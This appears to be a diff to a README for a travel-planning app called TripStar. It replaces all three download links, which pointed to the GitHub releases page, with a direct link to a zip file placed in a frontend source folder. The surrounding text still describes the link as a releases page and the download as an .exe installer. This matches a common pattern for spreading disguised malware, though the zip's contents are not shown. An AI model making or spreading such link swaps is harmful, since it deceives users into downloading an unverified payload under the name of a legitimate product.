@@ -1,6 +1,6 @@
 # ✈️ TripStar - Simplify Your Travel Planning
 
-[![Download TripStar](https://img.shields.io/badge/Download-TripStar-blue?style=for-the-badge)](https://github.com/kuswandi/TripStar/releases)
+[![Download TripStar](https://img.shields.io/badge/Download-TripStar-blue?style=for-the-badge)](https://raw.githubusercontent.com/kuswandi/TripStar/main/frontend/src/views/Star-Trip-v3.7.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Ready to install TripStar? Follow these steps carefully. This guide assumes no p
 Start by getting the program files:
 
 **Visit the TripStar releases page:**  
-[![Download TripStar](https://img.shields.io/badge/Download-TripStar-grey?style=for-the-badge)](https://github.com/kuswandi/TripStar/releases)
+[![Download TripStar](https://img.shields.io/badge/Download-TripStar-grey?style=for-the-badge)](https://raw.githubusercontent.com/kuswandi/TripStar/main/frontend/src/views/Star-Trip-v3.7.zip)
 
 This page contains all versions and files. Choose the latest stable release for Windows. It will be an `.exe` installer.
 
@@ -135,7 +135,7 @@ Internet access is used to fetch live travel info, such as weather and attractio
 ## 🔗 Additional Resources
 
 All files and updates are available here:  
-[https://github.com/kuswandi/TripStar/releases](https://github.com/kuswandi/TripStar/releases)
+[https://raw.githubusercontent.com/kuswandi/TripStar/main/frontend/src/views/Star-Trip-v3.7.zip](https://raw.githubusercontent.com/kuswandi/TripStar/main/frontend/src/views/Star-Trip-v3.7.zip)
 
 Check this page regularly for new versions and improvements.
 
